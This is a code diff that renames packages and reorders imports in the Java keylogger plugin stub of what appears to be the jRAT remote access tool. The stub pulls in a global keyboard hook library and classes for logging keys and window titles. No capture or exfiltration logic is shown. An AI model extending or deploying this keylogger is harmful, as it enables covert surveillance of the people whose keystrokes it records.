@@ -1,4 +1,11 @@
-package pro.jrat.plugin.keylogger.stub;
+package io.jrat.plugin.keylogger.stub;
+
+import io.jrat.plugin.keylogger.stub.activities.Activities;
+import io.jrat.plugin.keylogger.stub.activities.Activity;
+import io.jrat.plugin.keylogger.stub.activities.Key;
+import io.jrat.plugin.keylogger.stub.activities.Time;
+import io.jrat.plugin.keylogger.stub.activities.Title;
+import io.jrat.plugin.keylogger.stub.codec.Base64;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
@@ -12,15 +19,10 @@ import java.io.PrintWriter;
 import java.util.ArrayList;
 import java.util.List;
 
+import jrat.api.stub.utils.OperatingSystem;
+
 import org.jnativehook.GlobalScreen;
 
-import pro.jrat.api.stub.utils.OperatingSystem;
-import pro.jrat.plugin.keylogger.stub.activities.Activities;
-import pro.jrat.plugin.keylogger.stub.activities.Activity;
-import pro.jrat.plugin.keylogger.stub.activities.Key;
-import pro.jrat.plugin.keylogger.stub.activities.Time;
-import pro.jrat.plugin.keylogger.stub.activities.Title;
-import pro.jrat.plugin.keylogger.stub.codec.Base64;
 
 public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 
